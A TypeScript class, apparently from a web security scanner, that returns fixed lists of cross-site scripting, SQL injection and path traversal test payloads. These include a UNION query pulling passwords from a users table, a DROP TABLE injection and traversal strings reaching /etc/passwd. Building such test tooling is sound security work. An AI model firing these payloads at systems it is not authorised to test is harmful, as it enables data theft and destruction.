export class PayloadFactory {
  public getXSSPayloads(): string[] {
    return [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "javascript:alert(1)",
      '"><script>alert(1)</script>',
      "<svg/onload=alert(1)>",
    ];
  }

  public getSQLiPayloads(): string[] {
    return [
      "' OR 1=1 --",
      "' OR '1'='1",
      "admin' --",
      "UNION SELECT null, username, password FROM users --",
      "1; DROP TABLE users",
    ];
  }

  public getLFI_Payloads(): string[] {
    return [
      "../../../etc/passwd",
      "....//....//....//etc/passwd",
      "/var/www/html/index.php",
    ];
  }
}
